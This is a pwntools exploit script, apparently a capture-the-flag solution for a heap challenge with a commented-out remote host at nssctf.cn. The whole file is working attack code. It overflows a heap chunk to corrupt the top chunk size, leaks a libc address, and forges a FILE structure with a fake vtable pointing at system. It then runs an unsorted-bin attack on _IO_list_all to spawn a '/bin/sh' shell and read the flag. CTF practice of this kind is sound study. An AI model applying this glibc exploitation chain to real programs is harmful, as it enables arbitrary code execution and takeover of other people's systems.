from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

io=process("./pwn")
# io=remote("node4.anna.nssctf.cn",28437)
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")

def add(s,cc):
    io.sendlineafter("choice : ","1")
    io.sendlineafter("it\n",str(s))
    io.sendafter(b"Name?\n",cc)

def edit(s,cc):
    io.sendlineafter("choice : ","2")
    io.sendlineafter("it\n",str(s))
    io.sendafter(b"name\n",cc)

def show():
    io.sendlineafter("choice : ","3")
    
# gdb.attach(io.pid)
# pause()

heap_addr=int(io.recvline(),16)-0x10
print("heap_addr:",hex(heap_addr))

add(0x68,b"a")
edit(0x6f,b"\x00"*0x68+b"\x71\x0f\x00")

add(0xf70,b"a")

add(0x80,b"a"*8)
show()
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x3c5188
print("leak_addr:",hex(leak_addr))

_IO_list_all=leak_addr+libc.sym[b"_IO_list_all"]
sys_addr=leak_addr+libc.sym[b"system"]
fake_vtable=heap_addr+0x268


add(0x68,b"asd")

padding=b"a"*0x60

fakefile=b"/bin/sh\x00"+p64(0x61) #_flags -> /bin/sh
fakefile+=p64(0)+p64(_IO_list_all-0x10) #bk-> _IO_list_all-0x10
fakefile+=p64(0)+p64(1)
fakefile=fakefile.ljust(0xc0,b"\x00")
fakefile+=p64(0)*3
fakefile+=p64(fake_vtable)+p64(0)*2+p64(sys_addr) # fake_vtable+0x18 (vtable[3]) -> &sys_addr

padding+=fakefile

edit(len(padding),padding)

io.sendlineafter("choice : ","1")

gdb.attach(io.pid)
pause()

io.sendlineafter("it\n",b"1") #local

# io.sendlineafter("it\n",str(0x100)) #remote

# io.sendline(b"cat flag")

io.interactive()